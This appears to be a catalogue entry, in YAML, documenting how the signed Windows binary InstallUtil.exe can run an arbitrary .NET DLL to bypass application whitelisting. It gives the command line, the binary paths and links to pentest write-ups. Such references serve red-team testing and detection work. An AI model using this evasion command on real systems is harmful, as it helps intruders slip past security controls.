---
name: installutil.exe
description: 
functions:
  awl-bypass:
    - description: Execute the target .NET DLL or EXE.
      code: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
  execute:
    - description: Execute the target .NET DLL or EXE.
      code: InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
resources: 
    - resource: https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
    - resource: https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12
    - resource: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1118/T1118.md
    - resource: https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/
    - resource: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
fullpath: 
    - path: C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
    - path: C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe
    - path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
    - path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
notes: Thanks to Casey Smith - @subtee
---